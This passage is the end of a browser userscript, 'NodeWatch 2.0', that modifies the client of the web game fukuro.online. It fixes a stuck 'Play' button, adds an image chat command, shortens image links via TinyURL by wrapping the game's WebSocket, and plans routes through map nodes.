            const q = [startNode]; const reachableNodes = new Set([startNode]);
            while(q.length > 0) { const node = q.shift(); const neighbors = this.graph.get(node) || []; for(const neighbor of neighbors) { if (!reachableNodes.has(neighbor)) { reachableNodes.add(neighbor); q.push(neighbor); } } }
            const statusDiv = document.getElementById('nw-scan-status');
            if (statusDiv) statusDiv.textContent = 'Pre-calculating distances...';
            this.precomputeDistances(reachableNodes);
            if (statusDiv) statusDiv.textContent = 'Generating initial tour (NN)...';
            let nnTour = this.nearestNeighbor(reachableNodes, startNode);
            if (statusDiv) statusDiv.textContent = 'Optimizing tour (2-opt)...';
            let optimizedTour = this.twoOpt(nnTour);
            let finalPath = [];
            for (let i = 0; i < optimizedTour.length - 1; i++) {
                const segment = this.distanceCache.get(`${optimizedTour[i]}-${optimizedTour[i+1]}`);
                if (segment) { finalPath.push(...(i === 0 ? segment : segment.slice(1))); }
            }
            return finalPath;
        }
    };

    const GameFixes = {
        playButtonObserver: null,
        init() { this.observePlayButton(); },
        observePlayButton() {
            this.playButtonObserver = setInterval(() => {
                if (!window.location.hash.includes('/menu/player')) return;
                const playButton = document.getElementById('connectServer');
                if (!playButton || !State.isReady) return;
                if (playButton.textContent.trim() === 'Ожидайте...') {
                    const { player, playerCharacter, isConfigLoaded } = State.vuex.state;
                    const isSpriteLoaded = document.querySelector('#userSprite [data-preloading="false"]') !== null;
                    const canPlay = player.name && playerCharacter && playerCharacter.body && isConfigLoaded && isSpriteLoaded;
                    if (canPlay) {
                        console.log("[NodeWatch 2.0] 'Play' button is stuck. Forcing update.");
                        playButton.textContent = 'Играть';
                        playButton.disabled = false;
                    }
                }
            }, 1000);
        },
        destroy() { if (this.playButtonObserver) clearInterval(this.playButtonObserver); }
    };

    const GamePatcher = {
        init() {
            this.patchChatComponent();
        },
        findVueComponent(instance, name) {
            if (instance.$options.name === name) return instance;
            for (const child of instance.$children) {
                const found = this.findVueComponent(child, name);
                if (found) return found;
            }
            return null;
        },
        patchChatComponent() {
            const rootVue = document.getElementById('app').__vue__;
            if (!rootVue) {
                setTimeout(() => this.patchChatComponent(), 1000);
                return;
            }
            const chatComponent = this.findVueComponent(rootVue, 'Chat');
            if (chatComponent) {
                const newHint = "/img URL_картинки";
                if (!chatComponent.fullCommandList.includes(newHint)) {
                    chatComponent.fullCommandList.push(newHint);
                }
            } else {
                 setTimeout(() => this.patchChatComponent(), 1000);
            }
        }
    };

    function handleWebSocketMessage(event) {
        try {
            const data = JSON.parse(event.data);
            const myId = State.vuex.state.player.id;
            switch (data.reason) {
                case 'userJoin': if (data.user && data.user.id !== myId) UIManager.showNotification(`✅ <b>${data.user.name}</b> has joined.`, 'join'); break;
                case 'userLeft': if (data.initiator && data.initiator !== myId) { const player = State.vuex.state.players.find(p => p.id === data.initiator); UIManager.showNotification(`❌ <b>${player ? player.name : 'User'}</b> has left.`, 'leave'); } break;
                case 'server_online':
                    if (RpSearcher.isScanning) {
                        RpSearcher.processInitialData(data);
                    }
                    break;
            }
        } catch (e) { /* Ignore non-JSON messages */ }
    }

    function interceptWebSocket() {
        const originalWebSocket = unsafeWindow.WebSocket;
        unsafeWindow.WebSocket = function(url, protocols) {
            // Check if the URL is for one of the target game domains
            if (!url.includes('fukuro.online') && !url.includes('fukuro.su')) {
                return new originalWebSocket(url, protocols);
            }

            const wsInstance = new originalWebSocket(url, protocols);
            State.ws = wsInstance;
            const originalSend = wsInstance.send.bind(wsInstance);

            const IMAGE_URL_REGEX = /^(https?:\/\/[^\s]*\.(?:png|gif|jpg|jpeg|webp)[^\s]*)$/i;
            const IMG_COMMAND_REGEX = /^\/img\s+(https?:\/\/[^\s]+)/i;

            wsInstance.send = function(data) {
                try {
                    const message = JSON.parse(data);
                    if (message.reason === 'chatMessage' && State.settings.enableImgCommand) {
                        if (message.message.length > 500) { BotAPI.splitAndSendMessage(message.message); return; }

                        const trimmedMessage = message.message.trim();
                        const imgCommandMatch = trimmedMessage.match(IMG_COMMAND_REGEX);
                        const plainLinkMatch = trimmedMessage.match(IMAGE_URL_REGEX);

                        let urlToShorten = null;

                        if (imgCommandMatch) {
                            urlToShorten = imgCommandMatch[1];
                        } else if (plainLinkMatch) {
                            urlToShorten = plainLinkMatch[1];
                        }

                        if (urlToShorten && !urlToShorten.includes('tinyurl.com')) {
                             GM_xmlhttpRequest({
                                method: "GET",
                                url: `https://tinyurl.com/api-create.php?url=${encodeURIComponent(urlToShorten)}`,
                                onload: (response) => {
                                    const shortUrl = response.responseText;
                                    if (shortUrl && shortUrl.startsWith('http')) {
                                        // MODIFICATION: Prepend NRP chat indicator
                                        const newMessage = { ...message, message: `(( ${shortUrl}` };
                                        originalSend(JSON.stringify(newMessage));
                                    } else {
                                        originalSend(data);
                                    }
                                },
                                onerror: () => {
                                    originalSend(data);
                                }
                            });
                            return;
                        }
                    }
                } catch (e) { /* Not a JSON message */ }
                originalSend(data);
            };
            wsInstance.addEventListener('open', () => setTimeout(initializeVuex, 500));
            wsInstance.addEventListener('close', () => { State.isReady = false; UIManager.destroy(); GameFixes.destroy(); });
            wsInstance.addEventListener('message', handleWebSocketMessage);
            return wsInstance;
        };
    }

    function initializeVuex() {
        const appElement = document.getElementById('app');
        if (appElement && appElement.__vue__ && appElement.__vue__.$store) {
            State.vuex = appElement.__vue__.$store;
            State.isReady = true;
            console.log("[NodeWatch 2.0] Vuex store accessed successfully.");
            Tracker.sendData();
            Settings.load();
            UIManager.init();
            ImageRenderer.init();
            GameFixes.init();
            GamePatcher.init();
        } else {
            console.warn("[NodeWatch 2.0] Could not find Vuex store. Retrying...");
            setTimeout(initializeVuex, 1000);
        }
    }

    console.log("[NodeWatch 2.0] Script loaded. Waiting for WebSocket connection...");
    interceptWebSocket();

})();
